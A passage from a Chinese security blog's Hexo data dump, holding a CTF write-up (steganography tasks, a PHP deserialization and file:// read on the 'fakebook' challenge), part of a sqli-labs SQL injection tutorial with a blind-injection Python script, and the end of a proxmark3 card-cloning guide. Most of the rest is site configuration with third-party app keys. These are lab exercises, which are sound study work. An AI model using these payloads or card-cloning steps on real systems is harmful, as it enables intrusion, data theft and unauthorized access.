class=\"hljs-selector-class\">.eml</span>\n\n-----Finished</code></pre></p>\n<p>第二个方法是运行<code>dump to EML.bat</code>脚本转成eml格式<br><img src=\"/img/2018-07-26/10.png\" srcset=\"/img/static/loading.gif\" alt=\"10\"><br>写入到白卡（UID卡）上<br><pre><code class=\"hljs undefined\">proxmark3&gt; hf mf cload  dumpdata\nLoaded <span class=\"hljs-keyword\">from</span> <span class=\"hljs-built_in\">file</span>: dumpdata.eml</code></pre></p>\n<p>写卡是没有回显的，只能通过读取的方式查看有没有读取成功，对比两张卡的数据就可以看到数据是一模一样的，克隆就完成了<br><strong>IC卡破解不止这一种方法，能力和设备有限，以后有机会会继续学习下去</strong></p>"},{"title":"网鼎杯writeup（复现）","index_img":"/img/2018-08-21/index.jpg","date":"2018-08-21T09:40:30.000Z","_content":"~~不会ps的不是好ctfer~~\n<!--more-->\n\n### misc\n#### 0x00 clip\n题目是一个旧文件系统里恢复来的disk文件\n![3](/img/2018-08-21/3.png)\n本以为要用到专门的工具去打开找谷歌百度找了一遍啥也没发现，垃圾软件倒是装了不少，后来队友用010搜索IDAT发现一张有头的和没头的图片\n![7](/img/2018-08-21/7.png)\n![8](/img/2018-08-21/8.png)\n提取出来是这么个鬼样子的\n![4](/img/2018-08-21/4.png)\n![5](/img/2018-08-21/5.png)\n打横切开\n![9](/img/2018-08-21/9.png)\n重新拼接成下图（我队友做的）\n![10](/img/2018-08-21/10.png)\n感受到被**ps和脑洞**支配的恐惧了吗\n![12](/img/2018-08-21/12.jpg)\n#### 0x01 minified\n题目是一张图片\n![](/img/2018-08-21/flag_enc.png)\nStegSolve打开看到red plane0是一片黑色，猜测和0通道有关，分别把red、blue、green和alpha的0通道提取出来\n![](/img/2018-08-21/1.png)\n用StegSolve的image combiner功能分别对比，在用alpha和green进行XOR对比时可以清楚的看到flag(做出来的人是怎么想到对比0通道的？。)\n![2](/img/2018-08-21/2.png)\n感受到了被**脑洞**支配的恐惧了吗\n![11](/img/2018-08-21/12.jpg)\n\n### web\n~~web狗感受到来自世界的恶意，已哭晕在厕所~~\n#### 0x00 spider\n这道题参考官方给出的writeup-->[传送门](https://mp.weixin.qq.com/s?__biz=MzUzNTkyODI0OA==&mid=2247491146&idx=3&sn=62911c7eede3f3207bd3badb65983d8d&chksm=faff529dcd88db8b00fc09b58bd8d86ebbbd6463cba8d9319718e4ded7046fc60c76475aa943&mpshare=1&scene=23&srcid=0820KKS4SsULFtWOy9z1xffV#rd)\n#### 0x01 fakebook\n这道题是在比赛结束前1小时时候放出来的题目，一般这种题目都是送~~分题~~送命题\n![11](/img/2018-08-21/11.png)\n首先拿到题目后发现只能登陆或者join，join的时候发现第四个字段blog似乎只能是网址，一般这种有约束条件又没给出则一定是被隐藏了，查看robots.txt发现果然有东西\n![12](/img/2018-08-21/12.png)\n约束条件\n![13](/img/2018-08-21/13.png)\njoin之后发现只有username可以点，点进去后发现敏感参数\n![14](/img/2018-08-21/14.png)\n测试后得到的信息：4个字段，过滤了`union select`，第四个参数进行了序列化\n![15](/img/2018-08-21/15.png)\n在一段惊天地泣鬼神的注入下然鹅并没有在数据库里发现flag\n请教大佬获得hint1：构造类。这样构造出来的类可以执行，php代码如下\n```php\n<?php\nclass UserInfo\n{\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n}\n$a = new UserInfo();\n$a->name = '1';\n$a->age = 12;\n$a->blog = 'baidu.com';\necho serialize($a);\n?>\n```\n![21](/img/2018-08-21/21.png)\n![16](/img/2018-08-21/16.png)\n源码可以看到读取了文件\n![18](/img/2018-08-21/18.png)\n请教大佬获得hint2：curl读文件。\n源码提示了php调用curl来查询的，联想到curl可以执行读文件操作\n![17](/img/2018-08-21/17.png)\n把baidu.com改成file:///var/www/html/user.php进行测试发现可以读取user.php的内容验证猜想\n![19](/img/2018-08-21/19.png)\n读flag，file:///var/www/html/flag.php\n![20](/img/2018-08-21/20.png)\n\n","source":"_posts/2018-08-21-wangdingbei.md","raw":"---\ntitle: 网鼎杯writeup（复现）\nindex_img: /img/2018-08-21/index.jpg\ndate: 2018-08-21 17:40:30\ntags: \n- writeup\n- web\n- ctf\n- misc\n---\n~~不会ps的不是好ctfer~~\n<!--more-->\n\n### misc\n#### 0x00 clip\n题目是一个旧文件系统里恢复来的disk文件\n![3](/img/2018-08-21/3.png)\n本以为要用到专门的工具去打开找谷歌百度找了一遍啥也没发现，垃圾软件倒是装了不少，后来队友用010搜索IDAT发现一张有头的和没头的图片\n![7](/img/2018-08-21/7.png)\n![8](/img/2018-08-21/8.png)\n提取出来是这么个鬼样子的\n![4](/img/2018-08-21/4.png)\n![5](/img/2018-08-21/5.png)\n打横切开\n![9](/img/2018-08-21/9.png)\n重新拼接成下图（我队友做的）\n![10](/img/2018-08-21/10.png)\n感受到被**ps和脑洞**支配的恐惧了吗\n![12](/img/2018-08-21/12.jpg)\n#### 0x01 minified\n题目是一张图片\n![](/img/2018-08-21/flag_enc.png)\nStegSolve打开看到red plane0是一片黑色，猜测和0通道有关，分别把red、blue、green和alpha的0通道提取出来\n![](/img/2018-08-21/1.png)\n用StegSolve的image combiner功能分别对比，在用alpha和green进行XOR对比时可以清楚的看到flag(做出来的人是怎么想到对比0通道的？。)\n![2](/img/2018-08-21/2.png)\n感受到了被**脑洞**支配的恐惧了吗\n![11](/img/2018-08-21/12.jpg)\n\n### web\n~~web狗感受到来自世界的恶意，已哭晕在厕所~~\n#### 0x00 spider\n这道题参考官方给出的writeup-->[传送门](https://mp.weixin.qq.com/s?__biz=MzUzNTkyODI0OA==&mid=2247491146&idx=3&sn=62911c7eede3f3207bd3badb65983d8d&chksm=faff529dcd88db8b00fc09b58bd8d86ebbbd6463cba8d9319718e4ded7046fc60c76475aa943&mpshare=1&scene=23&srcid=0820KKS4SsULFtWOy9z1xffV#rd)\n#### 0x01 fakebook\n这道题是在比赛结束前1小时时候放出来的题目，一般这种题目都是送~~分题~~送命题\n![11](/img/2018-08-21/11.png)\n首先拿到题目后发现只能登陆或者join，join的时候发现第四个字段blog似乎只能是网址，一般这种有约束条件又没给出则一定是被隐藏了，查看robots.txt发现果然有东西\n![12](/img/2018-08-21/12.png)\n约束条件\n![13](/img/2018-08-21/13.png)\njoin之后发现只有username可以点，点进去后发现敏感参数\n![14](/img/2018-08-21/14.png)\n测试后得到的信息：4个字段，过滤了`union select`，第四个参数进行了序列化\n![15](/img/2018-08-21/15.png)\n在一段惊天地泣鬼神的注入下然鹅并没有在数据库里发现flag\n请教大佬获得hint1：构造类。这样构造出来的类可以执行，php代码如下\n```php\n<?php\nclass UserInfo\n{\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n}\n$a = new UserInfo();\n$a->name = '1';\n$a->age = 12;\n$a->blog = 'baidu.com';\necho serialize($a);\n?>\n```\n![21](/img/2018-08-21/21.png)\n![16](/img/2018-08-21/16.png)\n源码可以看到读取了文件\n![18](/img/2018-08-21/18.png)\n请教大佬获得hint2：curl读文件。\n源码提示了php调用curl来查询的，联想到curl可以执行读文件操作\n![17](/img/2018-08-21/17.png)\n把baidu.com改成file:///var/www/html/user.php进行测试发现可以读取user.php的内容验证猜想\n![19](/img/2018-08-21/19.png)\n读flag，file:///var/www/html/flag.php\n![20](/img/2018-08-21/20.png)\n\n","slug":"wangdingbei","published":1,"mouth":"08","updated":"2020-09-18T03:32:01.813Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhox3000bez8kl403zm4k","content":"<p><del>不会ps的不是好ctfer</del><br><a id=\"more\"></a></p>\n<h3 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h3><h4 id=\"0x00-clip\"><a href=\"#0x00-clip\" class=\"headerlink\" title=\"0x00 clip\"></a>0x00 clip</h4><p>题目是一个旧文件系统里恢复来的disk文件<br><img src=\"/img/2018-08-21/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"><br>本以为要用到专门的工具去打开找谷歌百度找了一遍啥也没发现，垃圾软件倒是装了不少，后来队友用010搜索IDAT发现一张有头的和没头的图片<br><img src=\"/img/2018-08-21/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"><br><img src=\"/img/2018-08-21/8.png\" srcset=\"/img/static/loading.gif\" alt=\"8\"><br>提取出来是这么个鬼样子的<br><img src=\"/img/2018-08-21/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"><br><img src=\"/img/2018-08-21/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"><br>打横切开<br><img src=\"/img/2018-08-21/9.png\" srcset=\"/img/static/loading.gif\" alt=\"9\"><br>重新拼接成下图（我队友做的）<br><img src=\"/img/2018-08-21/10.png\" srcset=\"/img/static/loading.gif\" alt=\"10\"><br>感受到被<strong>ps和脑洞</strong>支配的恐惧了吗<br><img src=\"/img/2018-08-21/12.jpg\" srcset=\"/img/static/loading.gif\" alt=\"12\"></p>\n<h4 id=\"0x01-minified\"><a href=\"#0x01-minified\" class=\"headerlink\" title=\"0x01 minified\"></a>0x01 minified</h4><p>题目是一张图片<br><img src=\"/img/2018-08-21/flag_enc.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>StegSolve打开看到red plane0是一片黑色，猜测和0通道有关，分别把red、blue、green和alpha的0通道提取出来<br><img src=\"/img/2018-08-21/1.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>用StegSolve的image combiner功能分别对比，在用alpha和green进行XOR对比时可以清楚的看到flag(做出来的人是怎么想到对比0通道的？。)<br><img src=\"/img/2018-08-21/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>感受到了被<strong>脑洞</strong>支配的恐惧了吗<br><img src=\"/img/2018-08-21/12.jpg\" srcset=\"/img/static/loading.gif\" alt=\"11\"></p>\n<h3 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h3><p><del>web狗感受到来自世界的恶意，已哭晕在厕所</del></p>\n<h4 id=\"0x00-spider\"><a href=\"#0x00-spider\" class=\"headerlink\" title=\"0x00 spider\"></a>0x00 spider</h4><p>这道题参考官方给出的writeup–&gt;<a href=\"https://mp.weixin.qq.com/s?__biz=MzUzNTkyODI0OA==&amp;mid=2247491146&amp;idx=3&amp;sn=62911c7eede3f3207bd3badb65983d8d&amp;chksm=faff529dcd88db8b00fc09b58bd8d86ebbbd6463cba8d9319718e4ded7046fc60c76475aa943&amp;mpshare=1&amp;scene=23&amp;srcid=0820KKS4SsULFtWOy9z1xffV#rd\" target=\"_blank\" rel=\"noopener\">传送门</a></p>\n<h4 id=\"0x01-fakebook\"><a href=\"#0x01-fakebook\" class=\"headerlink\" title=\"0x01 fakebook\"></a>0x01 fakebook</h4><p>这道题是在比赛结束前1小时时候放出来的题目，一般这种题目都是送<del>分题</del>送命题<br><img src=\"/img/2018-08-21/11.png\" srcset=\"/img/static/loading.gif\" alt=\"11\"><br>首先拿到题目后发现只能登陆或者join，join的时候发现第四个字段blog似乎只能是网址，一般这种有约束条件又没给出则一定是被隐藏了，查看robots.txt发现果然有东西<br><img src=\"/img/2018-08-21/12.png\" srcset=\"/img/static/loading.gif\" alt=\"12\"><br>约束条件<br><img src=\"/img/2018-08-21/13.png\" srcset=\"/img/static/loading.gif\" alt=\"13\"><br>join之后发现只有username可以点，点进去后发现敏感参数<br><img src=\"/img/2018-08-21/14.png\" srcset=\"/img/static/loading.gif\" alt=\"14\"><br>测试后得到的信息：4个字段，过滤了<code>union select</code>，第四个参数进行了序列化<br><img src=\"/img/2018-08-21/15.png\" srcset=\"/img/static/loading.gif\" alt=\"15\"><br>在一段惊天地泣鬼神的注入下然鹅并没有在数据库里发现flag<br>请教大佬获得hint1：构造类。这样构造出来的类可以执行，php代码如下<br><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">UserInfo</span>\n</span>&#123;\n    <span class=\"hljs-keyword\">public</span> $name = <span class=\"hljs-string\">\"\"</span>;\n    <span class=\"hljs-keyword\">public</span> $age = <span class=\"hljs-number\">0</span>;\n    <span class=\"hljs-keyword\">public</span> $blog = <span class=\"hljs-string\">\"\"</span>;\n&#125;\n$a = <span class=\"hljs-keyword\">new</span> UserInfo();\n$a-&gt;name = <span class=\"hljs-string\">'1'</span>;\n$a-&gt;age = <span class=\"hljs-number\">12</span>;\n$a-&gt;blog = <span class=\"hljs-string\">'baidu.com'</span>;\n<span class=\"hljs-keyword\">echo</span> serialize($a);\n<span class=\"hljs-meta\">?&gt;</span></code></pre></p>\n<p><img src=\"/img/2018-08-21/21.png\" srcset=\"/img/static/loading.gif\" alt=\"21\"><br><img src=\"/img/2018-08-21/16.png\" srcset=\"/img/static/loading.gif\" alt=\"16\"><br>源码可以看到读取了文件<br><img src=\"/img/2018-08-21/18.png\" srcset=\"/img/static/loading.gif\" alt=\"18\"><br>请教大佬获得hint2：curl读文件。<br>源码提示了php调用curl来查询的，联想到curl可以执行读文件操作<br><img src=\"/img/2018-08-21/17.png\" srcset=\"/img/static/loading.gif\" alt=\"17\"><br>把baidu.com改成file:///var/www/html/user.php进行测试发现可以读取user.php的内容验证猜想<br><img src=\"/img/2018-08-21/19.png\" srcset=\"/img/static/loading.gif\" alt=\"19\"><br>读flag，file:///var/www/html/flag.php<br><img src=\"/img/2018-08-21/20.png\" srcset=\"/img/static/loading.gif\" alt=\"20\"></p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark42":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<p><del>不会ps的不是好ctfer</del><br>","more":"</p>\n<h3 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h3><h4 id=\"0x00-clip\"><a href=\"#0x00-clip\" class=\"headerlink\" title=\"0x00 clip\"></a>0x00 clip</h4><p>题目是一个旧文件系统里恢复来的disk文件<br><img src=\"/img/2018-08-21/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"><br>本以为要用到专门的工具去打开找谷歌百度找了一遍啥也没发现，垃圾软件倒是装了不少，后来队友用010搜索IDAT发现一张有头的和没头的图片<br><img src=\"/img/2018-08-21/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"><br><img src=\"/img/2018-08-21/8.png\" srcset=\"/img/static/loading.gif\" alt=\"8\"><br>提取出来是这么个鬼样子的<br><img src=\"/img/2018-08-21/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"><br><img src=\"/img/2018-08-21/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"><br>打横切开<br><img src=\"/img/2018-08-21/9.png\" srcset=\"/img/static/loading.gif\" alt=\"9\"><br>重新拼接成下图（我队友做的）<br><img src=\"/img/2018-08-21/10.png\" srcset=\"/img/static/loading.gif\" alt=\"10\"><br>感受到被<strong>ps和脑洞</strong>支配的恐惧了吗<br><img src=\"/img/2018-08-21/12.jpg\" srcset=\"/img/static/loading.gif\" alt=\"12\"></p>\n<h4 id=\"0x01-minified\"><a href=\"#0x01-minified\" class=\"headerlink\" title=\"0x01 minified\"></a>0x01 minified</h4><p>题目是一张图片<br><img src=\"/img/2018-08-21/flag_enc.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>StegSolve打开看到red plane0是一片黑色，猜测和0通道有关，分别把red、blue、green和alpha的0通道提取出来<br><img src=\"/img/2018-08-21/1.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>用StegSolve的image combiner功能分别对比，在用alpha和green进行XOR对比时可以清楚的看到flag(做出来的人是怎么想到对比0通道的？。)<br><img src=\"/img/2018-08-21/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>感受到了被<strong>脑洞</strong>支配的恐惧了吗<br><img src=\"/img/2018-08-21/12.jpg\" srcset=\"/img/static/loading.gif\" alt=\"11\"></p>\n<h3 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h3><p><del>web狗感受到来自世界的恶意，已哭晕在厕所</del></p>\n<h4 id=\"0x00-spider\"><a href=\"#0x00-spider\" class=\"headerlink\" title=\"0x00 spider\"></a>0x00 spider</h4><p>这道题参考官方给出的writeup–&gt;<a href=\"https://mp.weixin.qq.com/s?__biz=MzUzNTkyODI0OA==&amp;mid=2247491146&amp;idx=3&amp;sn=62911c7eede3f3207bd3badb65983d8d&amp;chksm=faff529dcd88db8b00fc09b58bd8d86ebbbd6463cba8d9319718e4ded7046fc60c76475aa943&amp;mpshare=1&amp;scene=23&amp;srcid=0820KKS4SsULFtWOy9z1xffV#rd\" target=\"_blank\" rel=\"noopener\">传送门</a></p>\n<h4 id=\"0x01-fakebook\"><a href=\"#0x01-fakebook\" class=\"headerlink\" title=\"0x01 fakebook\"></a>0x01 fakebook</h4><p>这道题是在比赛结束前1小时时候放出来的题目，一般这种题目都是送<del>分题</del>送命题<br><img src=\"/img/2018-08-21/11.png\" srcset=\"/img/static/loading.gif\" alt=\"11\"><br>首先拿到题目后发现只能登陆或者join，join的时候发现第四个字段blog似乎只能是网址，一般这种有约束条件又没给出则一定是被隐藏了，查看robots.txt发现果然有东西<br><img src=\"/img/2018-08-21/12.png\" srcset=\"/img/static/loading.gif\" alt=\"12\"><br>约束条件<br><img src=\"/img/2018-08-21/13.png\" srcset=\"/img/static/loading.gif\" alt=\"13\"><br>join之后发现只有username可以点，点进去后发现敏感参数<br><img src=\"/img/2018-08-21/14.png\" srcset=\"/img/static/loading.gif\" alt=\"14\"><br>测试后得到的信息：4个字段，过滤了<code>union select</code>，第四个参数进行了序列化<br><img src=\"/img/2018-08-21/15.png\" srcset=\"/img/static/loading.gif\" alt=\"15\"><br>在一段惊天地泣鬼神的注入下然鹅并没有在数据库里发现flag<br>请教大佬获得hint1：构造类。这样构造出来的类可以执行，php代码如下<br><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">UserInfo</span>\n</span>&#123;\n    <span class=\"hljs-keyword\">public</span> $name = <span class=\"hljs-string\">\"\"</span>;\n    <span class=\"hljs-keyword\">public</span> $age = <span class=\"hljs-number\">0</span>;\n    <span class=\"hljs-keyword\">public</span> $blog = <span class=\"hljs-string\">\"\"</span>;\n&#125;\n$a = <span class=\"hljs-keyword\">new</span> UserInfo();\n$a-&gt;name = <span class=\"hljs-string\">'1'</span>;\n$a-&gt;age = <span class=\"hljs-number\">12</span>;\n$a-&gt;blog = <span class=\"hljs-string\">'baidu.com'</span>;\n<span class=\"hljs-keyword\">echo</span> serialize($a);\n<span class=\"hljs-meta\">?&gt;</span></code></pre></p>\n<p><img src=\"/img/2018-08-21/21.png\" srcset=\"/img/static/loading.gif\" alt=\"21\"><br><img src=\"/img/2018-08-21/16.png\" srcset=\"/img/static/loading.gif\" alt=\"16\"><br>源码可以看到读取了文件<br><img src=\"/img/2018-08-21/18.png\" srcset=\"/img/static/loading.gif\" alt=\"18\"><br>请教大佬获得hint2：curl读文件。<br>源码提示了php调用curl来查询的，联想到curl可以执行读文件操作<br><img src=\"/img/2018-08-21/17.png\" srcset=\"/img/static/loading.gif\" alt=\"17\"><br>把baidu.com改成file:///var/www/html/user.php进行测试发现可以读取user.php的内容验证猜想<br><img src=\"/img/2018-08-21/19.png\" srcset=\"/img/static/loading.gif\" alt=\"19\"><br>读flag，file:///var/www/html/flag.php<br><img src=\"/img/2018-08-21/20.png\" srcset=\"/img/static/loading.gif\" alt=\"20\"></p>"},{"title":"sqli-labs的学习记录三（23-30）","index_img":"/img/2018-07-20/index.jpg","date":"2018-08-17T13:51:53.000Z","_content":"七夕什么的，tan90°\n<!--more-->\n\n##### 第二十三关\n测试\n`id=1' and '1'='1`时返回正常，测试`id=-1' order by 1 #`就报错了，查看源代码可以看到我们递交的参数被过滤了--和#\n![1](/img/2018-08-17/1.png)\n```\n$id=$_GET['id'];\n$reg = \"/#/\";\n$reg1 = \"/--/\";\n$replace = \"\";\n$id = preg_replace($reg, $replace, $id);\n$id = preg_replace($reg1, $replace, $id);\n```\n所以不能用注释的方法只能闭合查询语句，我们可以套用第八关的代码进行盲注查询\n```\nid=1' and ascii(substr(database(),1,1)) >= '97\n```\n![2](/img/2018-08-17/2.png)\npython脚本代码\n```python\nimport requests\ntxt1 = \"http://localhost/sqli-labs/Less-23/?id=1' and ascii(substr(database(),\"\ntxt2 = \",1)) >= '\"\ntxt3 = \",1)) = '\"\npayload1 = 1 \npayload2 = 97\ntxt4 = 'Your Login name'\nnum11 = 97\nnum12 = 65\nnum13 = 48\ncode = ''\nnum1 = 0\nnum2 = 0\nnum3 = 0\nfor i in range(1,9):\n\turl = txt1+str(i)+txt2+str(num11)\n\treq = requests.get(url = url)\n\treqtext = req.text[554:569]\n\tif(reqtext == txt4):\n\t\tnum1 = 1\n\n\turl = txt1+str(i)+txt2+str(num12)\n\treq = requests.get(url = url)\n\treqtext = req.text[554:569]\n\tif(reqtext == txt4):\n\t\tnum2 = 1\n\n\turl = txt1+str(i)+txt2+str(num13)\n\treq = requests.get(url = url)\n\treqtext = req.text[554:569]\n\tif(reqtext == txt4):\n\t\tnum3 = 1\n\n\n\tif(num1 == 1):\n\t\tnum = 97\n\t\tnum += 13\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[554:569]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 6\n\t\telse:\n\t\t\tnum -= 7\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[554:569]\n\t\tif(reqtext == txt4):\n\t\t\tnum += 3\n\t\telse:\n\t\t\tnum -= 3\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[554:569]\n\t\tif(reqtext != txt4):\n\t\t\tnum -= 3\n\t\tif(reqtext == txt4) and ((num == 106) or (num == 119)):\n\t\t\tfor j in range(num,num+4):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[554:569]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\t\telse:\n\t\t\tfor j in range(num,num+3):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[554:569]\n\t\t\t\tif(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\tprint code\n\t\t\t\t\tnum1 = 0\n\t\t\t\t\tnum2 = 0\n\t\t\t\t\tnum3 = 0\n\tif(num1 == 0 and num2 == 1):\n\t\tnum = 65\n\t\tnum += 13\n\t\turl = 